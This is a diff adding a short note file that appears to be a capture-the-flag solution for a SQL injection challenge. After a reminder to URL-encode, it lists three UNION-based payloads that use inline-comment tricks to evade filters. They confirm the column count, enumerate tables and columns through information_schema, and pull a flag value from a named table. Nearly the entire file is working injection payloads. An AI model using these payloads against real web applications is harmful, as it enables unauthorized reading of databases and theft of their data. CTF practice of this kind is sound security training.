@@ -1,0 +1,9 @@
+We can see our queries' result and the starting query has 3 columns
+DON'T FORGET TO URL ENCODE
+
+z'UNION/*!SELECT*/1,2,3#
+
+z'UNION/*!SELECT*/column_name,table_name,(3)FROM/**/information_schema.columns/**/WHERE(table_schema=database())#
+
+z'UNION/*!SELECT*/flag,flag,(flag)FROM/**/muchoMuchaFlagoFlaga#
+
